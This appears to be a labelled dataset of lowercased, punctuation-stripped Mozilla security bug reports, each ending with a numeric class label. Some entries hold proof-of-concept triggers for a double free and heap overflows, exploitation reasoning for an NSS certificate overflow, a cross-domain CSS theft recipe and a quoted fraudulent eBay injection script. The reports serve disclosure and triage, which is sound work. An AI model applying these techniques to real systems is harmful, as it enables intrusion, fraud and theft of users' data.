followup_ip xul ns_newlocalfile_p+ddb 605eea6b 8b7718 mov esi dword ptr edi+18h symbol_stack_index 0 followup_name machineowner module_name xul image_name xul.dll debug_flr_image_timestamp 48dae678 symbol_name xul ns_newlocalfile_p+ddb stack_command 0s kb failure_bucket_id access_violation_xul ns_newlocalfile_p+ddb bucket_id access_violation_xul ns_newlocalfile_p+ddb followup machineowner 0:000 k childebp retaddr warning stack unwind information not available following frames may be wrong 0013e5c8 00000000 xul ns_newlocalfile_p 0:000 g eb4.998 access violation code c0000005 second chance eax=00000000 ebx=056ca0b0 ecx=00000000 edx=00290040 esi=069a7d8c edi=00000000 eip=605eea6b esp=0013e378 ebp=0013e5c8 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 xul ns_newlocalfile_p 605eea6b 8b7718 mov esi dword ptr edi+18h ds:0023:00000018	11
fix security theft of strings cross-domain with redirect script src and window.onerror user-agent mozilla/5.0 x11 u linux i686 x86_64 en-us rv:1.8.1.16 gecko/20080716 firefox/2.0.0.16 build identifier mozilla/5.0 x11 u linux i686 x86_64 en-us rv:1.8.1.16 gecko/20080716 firefox/2.0.0.16 the url above demos the problem nicely note that this is with ff3.0.3 this is essentially a new twist to the existing bug this bug was fixed in ff3 but the fix can be bypassed with the redirector trick also note that the bug referenced above underestimates the severity of leaking js error messages cross-domain hopefully my demo illustrates that reproducible always steps to reproduce 1 2 3	5
assertion the pointer to this sibling will be overwritten with moz-column table assertion the pointer to this sibling will be overwritten anewframe getnextsibling file users/jruderman/central/layout/generic/nsframelist.cpp line 176 assertion some objects allocated with allocateframe were not freed mframecount 0 file users/jruderman/central/layout/base/nspresshell.cpp line 675 likely exploitable the testcase does n't cause a crash but a variant created with the usual trick makes firefox dereference	11
assertion failure cursor uint8 copy messageargs 0 argscopysize at jsexn.c or assertion failure cursor uint8 copy messageargs 0 argscopysize at jsexn.cpp function f eval function switch x x default for x2 x y x function x y x break case x y x break gczeal 2 f asserts debug js trunk shell with and without j and 1.9.0.x debug js shell at assertion failure cursor uint8 copy messageargs 0 argscopysize at jsexn.cpp:188 compiling 1.9.0.x opt with gczeal seems to work as expected security-sensitive because it involves gczeal thanks waldo for guiding me along this one	11
1.9.0 mozilla firefox xul linked clones double free vulnerability zdi-can-423 tippingpoint has identified a vulnerability affecting the following products mozilla firefox 3.0.x vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page the specific flaw exists during the browsers garbage collection process when multiple dom elements are cloned and linked to one another and the browser is reloaded a memory corruption occurs resulting in a double free this can be leveraged to execute arbitrary code under the context of the current user the following basic javascript will reproduce the issue body document.getelementbyid mainbody noti document.createelementns xulns notification body.appendchild noti elem document.createelement div statusbar document.createelementns xulns statusbarpanel clone statusbar.clonenode 1 elem.appendchild clone for var x=0 x 10 x hs location.reload the body element must be connected to the dom after a few reloads of the website the browser will crash in most cases during garbage collection because it tries to free an object twice the elem object can be any element html svg xul etc the notification object has to be created and appended to the body element just cloning the statusbarpanel object and appending it to any element will not trigger the vulnerability credit this vulnerability was discovered by anonymous	11
the jar scheme ignores the content-disposition header on the inner uri when the jar scheme wraps a uri that returns a content-disposition attachment header that will be ignored and the inner zip file unpacked and the specified file interpreted anyway since content-disposition attachment is often used to prevent potentially dangerous or unknown content from being interpreted by browsers as part of the serving host s domain this can lead to security issues as in bug 472206 comment 27	9
crash nscssstylesheet getownernode after gc loading the testcase causes nscssstylesheet getownernode to call some random address the testcase assumes you have installed and uses it to trigger a gc at the right moment	11
jsop_defvar enables gvar optimization for non-permanent properties gvar optimization in the js_interpret can only be applied to permanent properties as it assumes that properties s slot stays the same but jsop_defvar fails to enforce this when it defines a variable that already exists jsop_defvar will enable the optimization even if such existing property does not have the jsprop_permanent attribute and can be deleted the following example demonstrates the problem watson~/m/tm/js/src cat s/y.js for var i 0 i 1000 i this a i 0 eval var x for var i 0 i 1000 i delete this a i watson~/m/tm/js/src cat s/x.js var x eval delete x x watson~/m/tm/js/src build/js64.tm.dbg/js f s/y.js f s/x.js assertion failure slot obj map freeslot at home/igor/m/tm/js/src/jsinterp.cpp:5623 aborted note that the example uses 2 file to ensure that the eval that define variable in the first file will be executed before jsop_defvar for the second in a browser this can be modeled with 2 script tags the bug is critical as it allows to read and write arbitrary data passed heap-allocated array	11
crash nstextframeutils transformtext with mathml lquote css quotes property testcase 1 assertion negative length getcontentend mcontentoffset 0 file nstextframe.h line 307 assertion bad index pruint32 aindex mstate.mlength file nstextfragment.h line 184 assertion integer overflow mmaxtextlength mmaxtextlength aframe getcontentlength file layout/generic/nstextframethebes.cpp line 1222 testcase 2 null deref crash nstextframeutils transformtext	11
xul scripts skip some security checks i experimented with different types of scripts and apparently xul scripts do n't trigger content policies the result is for example that the scripts are loaded even though javascript is disabled nswebbrowsercontentpolicy does n't have a say about this i attached a xul document loading livehttpheaders extension confirms that this script is loaded regardless of preferences looking at nsxuldocument loadscript the download is apparently started without any checks at all at least further down in nsxuldocument onstreamcomplete there is a call to nsscriptloader shouldexecutescript this must be the one preventing me from running a script from file however if i compare to nsscriptloader there are additionally calls to checkloaduriwithprincipal and checkcontentpolicy in startload both are missing for xul scripts	2
arbitrary code execution using sidebar in nssidebar.prototype.getinterfaces count is an object created in content thus it s unsafe to access count.value	9
non-200 responses to proxy connect requests lead to attacks on https i bet this bug is already on file but i do n't have access to all the security bugs so i m filing this one in the hopes that it gets duped against an existing bug threat model 1 the user has a proxy server configured 2 there is an active network attacker 3 the user visits attack the browser issues a connect request to the proxy server the active network attacker intercepts this request and replies with the following bytes http/1.1 404 not found content-type text/html charset=iso-8859-1 script alert document.cookie script the browser happily runs the network attacker s script in the security origin causing disaster chromium received this bug report and additional related bugs involving redirects from microsoft my understanding is that some researchers from msr are going to present about these bugs as the upcoming oakland security conference we should coordinate so we fix this issue in the same way more details are available at which i can give you access to thanks adam	1
improper character escaping and unescaping in alg1485.c secname.c nss s numerous functions for converting strings from ascii/utf8 to der and from der to ascii/utf8 including functions that return string values from cert name attributes which live in files alg1485.c and secname.c do not escape all characters that they should and do not unescape hex character pairs at all this has grave security implications i m afraid this is going to require a pretty big overhaul to some of that code	9
adobe flash loaded from view-source protocol network security policy bypass and localhost lso reading/writing user-agent mozilla/5.0 macintosh u ppc mac os x mach-o en-us rv:1.8.1.20 gecko/20081217 firefox/2.0.0.20 build identifier mozilla/5.0 macintosh u ppc mac os x mach-o en-us rv:1.8.1.20 gecko/20081217 firefox/2.0.0.20 the following was sent to adobe psirt psirt adobe.com overview when a flash file is loaded in mozilla firefox from within the view-source protocol handler the adobe flash plugin miscalculates the origin of the content to the plugin it appears the content was loaded from the local file system this introduces two specific security weaknesses bypass of crossdomain.xml and access to arbitrary third-party web content ability to read and write local shared objects within the context of localhost background in mozilla firefox it is n't normally possible to render content using the view-source pseudo protocol handler however by providing the content as a valid jar file the jar handler can be used to load a file as html from within the context of view-source this sequence would appear as jar view-source where data.jar would contain page.html content.swf the page.html file would include content.swf within an embed tag and the flash content would be loaded with a root path of view-source summary the flash security policy restricts objects from accessing third-party web content unless the third-party site opts in via a crossdomain.xml file for content that is loaded from the local file system no network access is allowed unless a user specifically allows it by adding a security exception but by default local flash objects can load any other local file system content because flash believes that any content loaded from view-source originated on the local machine the flash standard network security policy is not applied the standard crossdomain.xml file is not consulted mozilla firefox allows access to the third-party data because both sets of content originate on the network when a flash object is loaded from within the view-source protocol the content is created within the context of the localhost hostname this allows for the creation of local shared object lso that appears to originate from the localhost since the local networking restrictions can be circumvented by resubmitting the content using a view-source url coordinating third-party sites can read and write locally shared objects as well as post the information back in this way a complete privacy compromise and user tracking is possible details additional details and demonstrations are available at reproducible always	9
loading an untrusted stylesheet should not allow that stylesheet to inject script using xbl user-agent mozilla/5.0 x11 u linux i686 en-gb rv:1.9.0.6 gecko/2009020911 ubuntu/8.10 intrepid firefox/3.0.6 build identifier mozilla/5.0 x11 u linux i686 en-gb rv:1.9.0.6 gecko/2009020911 ubuntu/8.10 intrepid firefox/3.0.6 demonstrated by a fraudulent ebay listing which caused in-page details to be rewritten using a script hosted outside the ebay.co.uk domain link at this is a xss attack which exploits xbl javascript bindings the ebay listing contained this link media=all href type=text/css rel=stylesheet contains this code body width expression ebclientservercalldynamicscriptobject moz-binding url index index contains this code xml version 1.0 encoding utf-8 bindings xmlns xmlns xbl binding id index implementation constructor ebclientservercalldynamicscriptobject implementation binding bindings contains this code if typeof loadt undefined var mail fr33train gmail.com var price 163 3,200.00 var iit 1282528736197 var ma new array jan feb mar apr may jun jul aug sep oct nov dec var et new date svrgmt 3596 var year et.getyear if year 1000 year 1900 year new string year var ch et.gethours var cm et.getminutes var cs et.getseconds function lf var l document.links for var i 0 i l.length i if l i href.match d 12 i l i href.match ebayphotohosting/i l i href l i href.replace d 12 g iit var f document.forms for var i 0 i f.length i if f i item f i item.value iit try document.getelementbyid fastvidetailsbottom innerhtml itemid iit catch err try tabb document.getelementsbytagname table for i tabb.length 1 i 0 i if tabb i innerhtml.indexof questions from other members 1 i 1 tabb i 1 style.display none break catch err document.getelementbyid fastvipbibo getelementsbytagname table 1 insertrow 1 insertcell 0 innerhtml img src width 5 height 1 span class sectiontitle nobr b note this listing is restricted to pre-approved bidder/buyer list b nobr span br span class standard email the seller at mail to buy this item span var t1 document.getelementbyid fastvipdetails getelementsbytagname table 0 var tr1 t1.getelementsbytagname tr for var i 0 i tr1.length i if tr1 i innerhtml.match hr/i break c t1.insertrow i 1 insertcell 0 c.colspan 4 c.innerhtml img width 1 height 20 src r t1.insertrow i r.valign middle c r.insertcell 0 c.width 25 c.align left c.innerhtml span class titlepurchase img align middle style vertical-align text-bottom alt buy it now src price span c r.insertcell 1 c.nowrap yes c.innerhtml span class sectiontitle b price b span c r.insertcell 2 c.width 85 c.innerhtml button style padding-right 0px class vipribtn type submit span class btn span class btn buy it now span span button c t1.insertrow i 1 insertcell 0 c.colspan 4 tr1 t1.getelementsbytagname tr var nr new regexp d 1,3 d 1,3 d 1,3 d 2 for var i tr1.length 1 i 0 i td1 tr1 i getelementsbytagname td for var j 0 j td1.length j var ttd td1 j innerhtml if ttd.match end time/i td1 j 1 innerhtml font color ff0000 class sectiontitle nobr 59 mins 56 secs nobr font nobr ma et.getmonth et.getdate year.substr 2 2 ch 10 0 ch cm 10 0 cm cs 10 0 cs pdt nobr break if ttd.match nr tr1 i innerhtml.match buy it now td1 j innerhtml ttd.replace nr 0.99 break if ttd.match costs i td1 j 1 innerhtml b free b br standard flat rate shipping service break if ttd.match to i td1 j 1 innerhtml united kingdom united states canada break if ttd.match item location/i td1 j 1 innerhtml free shipping break if ttd.match history/i td1 j 1 innerhtml td1 j 1 innerhtml.replace bidders list|\d+\s a-z 0 bids im break if tr1 i innerhtml.match quantity|cost per item|high bidder im t1.deleterow tr1 i rowindex var d document.getelementsbytagname td for var i 0 i d.length i if d i innerhtml.match a href https a-z0-9 a-z0-9 email the seller a im d i innerhtml d i innerhtml.replace a href https a-z0-9 a-z0-9 email the seller a im email the seller mail break if d i innerhtml.match d 12 d i innerhtml d i innerhtml.replace d 12 iit lf ebay.odocument.opage.onafterload lf loadt true you can see more examples using this possible zero day attack at reproducible always steps to reproduce 1 visit ebay page if it s still up at actual results the content being rewritten before your very eyes reload and trying to hit stop before the xbl document loads means you can see the original page if you let it fully load you see the fraudulently modified page the content is rewritten unless you prevent that remote stylesheet chain being fully loaded expected results this should not be possible and i believe reveals an xss vulnerability for firefox firefox should prevent xbl bindings from remote locations in the same way it prevents other active content let me know if i m missing some important aspect here and this should n't be considered a security issue for firefox the use of xbl suggests that firefox security is at fault here but i d like to understand more and file more relevant/useful/well-informed bugs in the future	9
reliable way to cause double frame construction for content using xbl testcase is attached you might need to download it locally due to bugzilla s attachment uri thing but it d work on any web server the basic idea is to have a binding with two insertion points one of these needs to be an inline and the other needs to be a descendant of the inline s containing block the we force a contentappended with at least two nodes after the binding has been attached the testcase uses a script that blocks the parser and spins the event queue using sync xhr until the binding has been attached the first node has block display and goes into the inline insertion point the others go into the other insertion point since there are multiple insertion points the frame constructor converts the contentappended call into a sequence of contentinserted calls the first contentinserted sticks a block inside the inline insertion point which reframes the containing block after that we already have frames for all the other kids and their contentinserted calls end up double-creating the frames the testcase just uses a single doubled kid a textnode that uses the text doubled which should n't be crashy but it could easily toss in iframes image frames etc and cause various trouble possible solutions i see 1 do a getprimaryframefor before doing contentinserted in this case that would also bite fieldsets since those claim multiple insertion points but might be ok 2 if a node has a binding with multiple insertion points including nested ones etc never add more than one child at a time to it notify after each child 2 is hard to do with our current parser not sure about henri s parser and in any case we d need it for both xhtml and html the page could be html if it just linked to a separate xbl file thoughts	9
investigate ntlm reflection vulnerability peter allor from ibm x-force reported that mozilla s ntlm implementation is vulnerable to a type of reflection attack by which firefox can be used to forward ntlm credentials to an arbitrary site i will attach the complete advisory shortly but here are the first two paragraphs microsoft s ms08-068 patch addresses a smb/ntlm vulnerability which allows an attacker to use a victim s ntlm credential in order to gain access to the victim s shared resources this attack is often called a reflection attack the fix successfully protects a host against active exploitation by using tools such as smbrelay included in metasploit similarly part of this month s ms08-076 patch addresses instances in which a windows media component fails to initialize ntlm security and thus opens an affected host to a potential reflection attack however neither of these patches as pointed out by hd moore address an attack that involves multiple targets since credential tokens used in all existing ntlm authentication protocols i.e lm ntlm and ntlmv2 can be forwarded to any host in other words the true vulnerability lies in the ntlm authentication s design this protocol flaw can be particularly troublesome since there are many applications that support ntlm in addition we discovered that popular applications such as mozilla firefox and opera are vulnerable to the reflection attack which involves two parties therefore it is worth taking some time to discuss the internals of ntlm authentication in detail in order to understand the full extent of the vulnerability for the rest of this article we refer to two types of reflection attacks as two-party reflection attack and multi-host reflection attack in a two-party reflection attack attacker uses a stolen credential against the same victim where as in a multi-host reflection attack the credential is forwarded to a host other than the original victim	1
arbitrary code execution using event listeners attached to an element whose owner document is null this is a variant of bug 383424 fx3 and fx2 are affected the owner document of an element can become null after gc if the owner document is null nscxpusher push does not push a js context and thus event listeners can be executed on the wrong js context on trunk if the owner document is null nscxpusher push fails and thus event listeners are not executed	9
xmldocument load does n't check nsicontentpolicy nsxmldocument load will do same-origin checks on the url to be loaded but wo n't check content policies i think it should call content policies with type_xmlhttprequest and use calling document as context	9
make dns-prefetching subject to user-defined policies bug 453403 implemented dns prefetching in necko which has severe security implications local html pages will generate dns queries even if other remote content is disabled e.g for mere a href this gets even more creepy if we take into account that seamonkey and thunderbird render all messages even plaintext ones as html documents in a browser element thus reading a plaintext message will already make you acknowledge the existence of this account e.g by using one-time subdomain entries because even in plaintext mode links are rendered as clickable items until now there was a commonly agreed assumption that reading local html without remote content will keep your privacy intact this promise is broken now while you can turn off the prefetching entirely by using network.dns.disableprefetch this is no real option for seamonkey although maybe for tb because you ca n't seriously apply one single setting to public websurfing viewing local html documents in the browser and reading mail all alike without affecting user experience we could even work around the mail case by trying to produce certain markup but that is rather band-aiding than fixing the real issue and of course this will not help a bit when viewing local html documents in the browser	6
pl_base64decode integer overflow user-agent mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9.0.10 gecko/2009042316 firefox/3.0.10 net clr 3.5.30729 build identifier mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9.0.10 gecko/2009042316 firefox/3.0.10 net clr 3.5.30729 pl_base64deconde in nsprpub/lib/libc/src/base64.c appears to suffer from an integer overflow issue while determine the size of the dest buffer i only spent a small amount of time trying to determine if it was possible to trigger this but with no success i ve since discarded it from my list of bugs to investigate but wanted to pass it on since pl_base64decode is used in several locations it may be possible for a remote attacker to trigger the overflow once the overflow is triggered it would be a rather simple bug to exploit since an attacker can control the exact amount of data to overflow the buffer with by using invalid base64 characters to no op the decoding if you feel it is not possible to trigger the integer overflow then please just fix the code and call it a potential bug i labeled it as a security bug because someone with more knowledge of your code might see things i do not reproducible could n't reproduce steps to reproduce 1 use one of the many callers to pl_base64decode and pass a string large enough to overflow the size of the dest 2 3 most likely would only be exploitable on high end computers	11
crash push_tag or real_write if a message with text/enriched part is viewed user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.9.0.5 gecko/2008121621 ubuntu/8.04 hardy firefox/3.0.10 build identifier mozilla thunderbird version 2.0.0.19 20090105 a message with this structure multipart/mixed multipart/related multipart/alternative text/plain text/html text/enriched kills thunderbird every time let me see if i can attach the actual example reproducible always steps to reproduce 1 append the attached example to the pop server s mbox folder where it keeps my mail 2 hit get mail in thunderbird actual results thunderbird dies and keeps dying if i log into the pop server expected results not crashed display the message whichever of the alternates it favours my colleague s windows installation version 2.0.0.12 20080708 also dies when she views the evil message the only way i can recover is if i hit cancel on the server login prompt then right-click delete message without selecting the evil message which would preview it also i have to delete the message from the mbox file vim from d win	9
arbitrary code execution with firebug xmlhttprequestspy spy.js top.xmlhttprequestspy.prototype attach function this.onreadystatechange this.xhrrequest.onreadystatechange when accessing this.xhrrequest.onreadystatechange content functions queryinterface getinterfaces etc can be called	9
exploitable heap overflow in nss shell expression filename globbing parsing this bug was reported to security m.o by moxie marlinspike from the email the second of two is a heap overflow in the nss code for which the stars actually align and make it exploitable security/nss/lib/util/portreg.c 141 static int 142 handle_union const char str const char exp prbool case_insensitive 143 144 char e2 char port_alloc sizeof char strlen exp 145 register int t p2 p1 1 146 int cp 147 148 while 1 149 for cp=1 exp cp cp 150 if exp cp 151 cp 152 for p2 0 exp p1 p1 cp p1 p2 153 if exp p1 154 e2 p2 exp p1 155 e2 p2 exp p1 156 157 for t=cp+1 e2 p2 exp t 0 t p2 158 if shexp_match str e2 case_insensitive match 159 port_free e2 160 return match 161 162 if p1 cp 163 port_free e2 164 return nomatch 165 166 else p1 167 168 you malloc out based on the strlen on line 144 but then copy and happily copy past 0 until you see on line 154 a 0 char can be placed in this string wherever you want by including a in the string that is originally passed in to the parent function that is two levels up 263 static int 264 port_regexpmatch const char str const char xp prbool case_insensitive 265 register int x 266 char exp 0 267 268 exp port_strdup xp 269 270 if exp 271 return 1 272 273 for x=strlen exp 1 x x 274 if exp x exp x-1 275 exp x 0 276 if shexp_match str exp x case_insensitive match 277 goto punt 278 break 279 280 281 if shexp_match str exp case_insensitive match 282 port_free exp 283 return 0 284 285 286 punt 287 port_free exp 288 return 1 289 you can see what happens to the on line 274 so a string such as foo~bar will allocate strlen foo and then overwrite the bytes bar past the allocated memory this heap overflow can be triggered through for instance the cn field of a certificate it seems like it should n't be possible to get arbitrary shellcode this far but it actually is if you generate a cert with your shellcode in the cn and then mark that asn.1 string as type nss lets everything in without mangling it the two nice things about this are 1 you do n't even have to get this signed you can present a self-signed cert to nss and it ll go to validate the cn anyway in order to compile the complete list of problems with the certificate 2 x509 is so fucked up that you can do almost all of the heap massaging and data placement you need with the certificate itself this means that it s possible to exploit this with img tags to https links since most of what you need can come in through the ssl connection itself it makes scatter-shot exploitation easier since you can post malicious img tags to forums and not have them filtered in contrast to many browser exploits which require that lots of js be rendered out	11
crash counttotalmimeattachments mimecontainer 0 thunderbird.exe counttotalmimeattachments mailnews/mime/src/mimemoz2.cpp:216 1 thunderbird.exe counttotalmimeattachments mailnews/mime/src/mimemoz2.cpp:223 2 thunderbird.exe counttotalmimeattachments mailnews/mime/src/mimemoz2.cpp:223 3 thunderbird.exe mimegetattachmentlist mailnews/mime/src/mimemoz2.cpp:568 4 thunderbird.exe mime_display_stream_complete mailnews/mime/src/mimemoz2.cpp:975 5 thunderbird.exe nsstreamconverter onstoprequest mailnews/mime/src/nsstreamconverter.cpp:1068 6 thunderbird.exe nsmsgprotocol onstoprequest mailnews/base/util/nsmsgprotocol.cpp:393 7 thunderbird.exe nsmailboxprotocol onstoprequest mailnews/local/src/nsmailboxprotocol.cpp:380 8 thunderbird.exe nsinputstreampump onstatestop netwerk/base/src/nsinputstreampump.cpp:576 9 thunderbird.exe nsinputstreampump oninputstreamready netwerk/base/src/nsinputstreampump.cpp:401 10 xpcom_core.dll nsinputstreamreadyevent run xpcom/io/nsstreamutils.cpp:111 11 xpcom_core.dll nsthread processnextevent xpcom/threads/nsthread.cpp:510 12 xpcom_core.dll ns_processnextevent_p objdir-tb/mozilla/xpcom/build/nsthreadutils.cpp:227 13 xpcom_core.dll nsthread shutdown xpcom/threads/nsthread.cpp:465 14 thunderbird.exe mozstorageconnection close storage/src/mozstorageconnection.cpp:244 15 xpcom_core.dll ns_invokebyindex_p xpcom/reflect/xptcall/src/md/win32/xptcinvoke.cpp:101 16 thunderbird.exe xpcwrappednative callmethod js/src/xpconnect/src/xpcwrappednative.cpp:2454 17 thunderbird.exe xpc_wn_callmethod js/src/xpconnect/src/xpcwrappednativejsops.cpp:1590	11
crash when using sspi and joined to ad under vista or later strcat nsimapflaganduidstate adduidcustomflagpair user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.9.1.2 gecko/20090803 fedora/3.5.2-2.fc11 firefox/3.5.2 build identifier 3.0b3 20090715140311 the uc berkeley central email system recently enabled gssapi support for smtp imap and pop thunderbird 2.0.0.22 on windows xp when joined to ad works fine however under vista or windows 7 and joined to ad thunderbird crashes when attempting to use sspi thunderbird 2 by default will always attempt to use sspi during smtp and we ve received widespread reports across campus of thunderbird crashing when attempting to send email setting network.auth-use-sspi to false returns thunderbird to a stable state we have been unable to get talkback data for thunderbird 2 so we ve replicated the problem with thunderbird 3.0b3 and breakpad which appears to also crash under sspi this bug may be a duplicate of bug 505971 however since this behaviour is widespread in our environment and thunderbird immediately crashes with smtp or imap when joined to ad on vista or later and sspi is enabled it seems worthwhile to file a separate bug report reproducible always steps to reproduce 1 join windows vista or later machine to campus.berkeley.edu ad 2 configure thunderbird client to use calmail.berkeley.edu which will advertise auth=gssapi for ssl/tls connections 3 attempt to send email with thunderbird 2 or under thunderbird 3 check use secure authentication for smtp setup or retrieve email with use secure authentication checked for imap/pop actual results thunderbird crashes expected results thunderbird performs gssapi sasl negotiation and sends email or retrieves email is a crash of 3.0b3 under vista using sspi to login to imap	11
copy-and-paste or drag-and-drop into designmode document allows xss user-agent mozilla/5.0 windows u windows nt 5.1 en-gb rv:1.9.1.3 gecko/20090824 firefox/3.5.3 net clr 3.5.30729 build identifier an iframe with its src attribute set to a data uri can be dragged into a designmode area the data uri renders an html link that if clicked will execute some javascript if a selection containing such an iframe is dragged between two different domains the javascript will execute in the context of the domain where it is dropped if an attacker can get a user to perform a drag and drop operation it is possible to perform xss on sites that use the designmode feature webkit and internet explorer are affected by similar bugs which i have reported in the relevant places reproducible always steps to reproduce see testcase	9
ssl spoofing by setting location.href to ssl page with 204 no content response this bug was reported to security m.o by jonathan morgan i moved his poc code into the attached testcase which requires being signed in to a google account to get the requisite 204 response from note the ssl indicators appear when viewing the testcase over http as well as file from the email if a secure https page returns http status 204 no content then the current page will show a verified security certificate for the current page one such page is part of google calendar which will give users a verified certificate for the site verified by thawte quite a lot of people are perpetually signed in to their google account meaning that adding the following script to your site would make it appear verified and secure to any user who is currently signed into the google account even if it was an http site not an https site	5
cross-domain data theft using css from chris evans the attack involves cross-domain css stylesheet loading because the css parser is very lax it will skip over any amount of preceding and following junk in its quest to find a valid selector here is an example of a valid selector body background-image url if a construct like this can be forced to appear anywhere in a cross-domain document then cross-domain theft may be possible the attacker can introduce this construct into a page by injecting two strings 1 body background-image url note that the seemingly redundant is to resync the css parser to make sure the evil descriptor parses properly further note that having the url start like a valid url is required to steal the text in some browsers 2 any anything between those two strings will then be cross-domain stealable the data is stolen cross domain with e.g window.getcomputedstyle body_element null getpropertyvalue background-image this works in most browsers for ie you use ele.currentstyle.backgroundimage there are a surprising number of places in internet sites where an attacker can do this it can apply to html xml json xhtml etc at this point an example is probably useful to set up for this example you need a get a yahoo mail account b make sure you are logged into it c e-mail the target victim yahoo account with the subject d wait a bit so that some sensitive e-mails fill the inbox or just simulate one e e-mail the target victim yahoo account with the subject body background-image url f send victim to theft page g the stolen text shown is achieved via cross-domain css theft other good examples i ve had success with are social networking sites where the attacker gets to leave arbitrary-text comments which are rendered on the victim s trusted page the main common construct that prevents exploitation is newlines obviously newlines can not be considered a defense escaping or encoding of quote characters can also interfere with exploitation one useful trick if is escaped use to enclose the css string part 2 on possible solutions to follow possible solutions first there are some solutions it is easy to reject 1 restrict read of css text if it came from a different domain this is a useful defense that i filed a while ago in a different bug but it will not help in this case the attacker can simply use as a prefix for the background-image value and wait for the http get to arrive which includes the stolen text in the payload 2 do not send cookies for cross-domain css loads this probably breaks a load of sites it is certainly a riskier approach i have not dared try it the solution that i m playing with is as follows activate strict mime type required in the event that the css was loaded via link tag or import as a cross-domain resource also crash hard if a css load fails due to strict mime type test failure i ve been running my build locally with these changes for a few days and there seems to be some merit in this approach i.e my browser has n't crashed apart from when i hit my attack urls i see that webkit has a history of defaulting to strict mime type required for all css loads and that historically broke some sites like dell.com and was reverted perhaps the web at large now has its mime types in order well enough to at least enforce strict for cross-domain css loads if too much breaks we have the additional level we can introduce of trying to parse the cross-domain css but bailing on first syntax error i d like to avoid a test that is going that deep into nuance however	5
firefox crash on image with src set to a resource with multipart/x-mixed-replace content type js_lookuppropertywithflags or rtlentercriticalsection user-agent mozilla/5.0 x11 u linux i686 en-us rv:1.9.1.4 gecko/20091016 firefox/3.5.4 build identifier mozilla/5.0 x11 u linux i686 en-us rv:1.9.1.4 gecko/20091016 firefox/3.5.4 visiting firefox 3.5.4 crashes after some time a clean profile without extensions and themes was used to reproduce after removing the clutter from the webpage source code all that remains to reproduce the crash was the image tag the src-attribute refers to a multipart/x-mixed-replace resource a reduced test case follows reproducible always steps to reproduce 1 visit test page 2 wait a few moments actual results firefox crashes the dialog to submit the crash report appears expected results do n't crash just show the image or reject it related crash report	11
fix for bug 380474 does not work with security wrappers bug 380474 was fixed by innerizing a window early to force an event listener to be attached to the old inner window but that fix does not deal with security wrappers obj_to_inner_object cx obj does nothing if obj is a security wrapper and we need a new fix once a patch in bug 428229 removes nseventreceiversh addeventlistenerhelper on 1.9.1/1.9.0 branches it s possible to perform an xss attack on trunk and 1.9.2 branch due to the fix for bug 504021 it s not possible to run code with the privileges of a target site but e.g it s possible to sniff keystrokes on a target site	9
heap buffer overflow and crash nsgenericdomdatanode settextinternal on 64-bit nils reported this bug to security mozilla.org here s his full message firefox 3.5 64-bit nsgenericdomdatanode settextinternal i found a heap buffer overflow vulnerability which is caused by a integer overflow in nsgenericdomdatanode settextinternal due to the amount of data needed to trigger the vulnerability 8 gigbytes this is only exploitable on 64-bit systems it was tested on ubuntu amd64 with the default install of firefox and a custom build of firefox on the same system the vulnerable code is in nsgenericdomdatanode settextinternal content/base/src/nsgenericdomdatanode.cpp:399 print32 newlength textlength acount alength prunichar to new prunichar newlength ns_ensure_true to ns_error_out_of_memory copy over appropriate data if 0 aoffset mtext.copyto to 0 aoffset if 0 alength memcpy to aoffset abuffer alength sizeof prunichar with a very large alength or textlength an attacker would be able to wrap the integer newlength resulting in an allocation of a too small buffer when alength is large than zero the memcpy will overflow the buffer a fix would use size_t or similar value types for all length values furthermore the result of calculations which may wrap should be checked the following proof-of-concept code will trigger the bug note that there will be multiple ways of triggering the issue poc code test.js fast way of allocating huge strings function getlongstr leng var str unescape udead var tsize leng while str.length tsize/6 str str str str.substring 0 tsize/6 var sz tsize 6 var comp str.length var ar new array var act 0 for var i=0 i i act comp ar.push str var longstr ar.join longstr longstr.substring 0 tsize/6 ar null str null longstr escape longstr return longstr function start var appendstr aa while appendstr.length 16500 appendstr+=appendstr var x document.createcomment alert created comment var longstr getlongstr x.appenddata appendstr x.insertdata longstr alert done start provided the test system has enough memory 8 gigabyte following crash will be triggered stack backtrace program received signal sigsegv segmentation fault in nsgenericdomdatanode settextinternal this aoffset=32640 acount=1992294400 abuffer alength=4294967292 anotify=1 at usr/include/bits/string3.h:52 52 return builtin___memcpy_chk dest src len bos0 dest gdb bt 10 0 in nsgenericdomdatanode settextinternal this aoffset=32640 acount=1992294400 abuffer alength=4294967292 anotify=1 at usr/include/bits/string3.h:52 1 in ns_invokebyindex_p that methodindex=4294951152 paramcount=32767 params at home/nils/64-bit/audit/firefox/mozilla-1.9.1/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_linux.cpp:208 2 in xpcwrappednative callmethod ccx mode=16 at home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/xpconnect/src/xpcwrappednative.cpp:2456 3 in xpc_wn_callmethod cx obj argc=3720560384 argv vp at home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/xpconnect/src/xpcwrappednativejsops.cpp:1590 4 in js_invoke cx argc=32767 vp flags=32767 at home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/jsinterp.cpp:1386 5 in js_interpret cx at home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/jsinterp.cpp:5179 6 in js_invoke cx argc=32767 vp flags=32767 type return to continue or q return to quit at home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/jsinterp.cpp:1394 7 in js_internalinvoke cx obj fval=140736913381888 flags=0 argc=32768 argv rval at home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/jsinterp.cpp:1447 8 in js_callfunctionvalue cx obj fval=140736913948416 argc=4288888568 argv rval at home/nils/64-bit/audit/firefox/mozilla-1.9.1/js/src/jsapi.cpp:5187 9 in nsjscontext calleventhandler this atarget ascope ahandler aargv arv at home/nils/64-bit/audit/firefox/mozilla-1.9.1/dom/src/base/nsjsenvironment.cpp:2085 more stack frames follow	11
